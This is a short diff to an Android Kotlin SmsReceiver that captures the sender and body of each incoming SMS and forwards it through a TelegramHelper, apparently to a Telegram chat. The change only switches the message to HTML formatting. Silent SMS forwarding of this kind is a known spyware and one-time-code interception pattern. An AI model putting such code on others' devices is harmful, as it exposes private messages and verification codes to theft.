@@ -12,8 +12,10 @@ class SmsReceiver : BroadcastReceiver() {
             val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
             val fullMessage = messages.joinToString("") { it.displayMessageBody ?: "" }
             val sender = messages.firstOrNull()?.displayOriginatingAddress ?: "Unknown"
-            val text = "📩 SMS from $sender:\n$fullMessage"
-            TelegramHelper.sendWithFallback(text, context)
+            val message = "<b>📩 SMS Received</b>\n" +
+                    "<b>📞 From:</b> $sender\n" +
+                    "<b>💬 Message:</b> <code>$fullMessage</code>"
+            TelegramHelper.sendWithFallback(message, context, "HTML")
         }
     }
 }
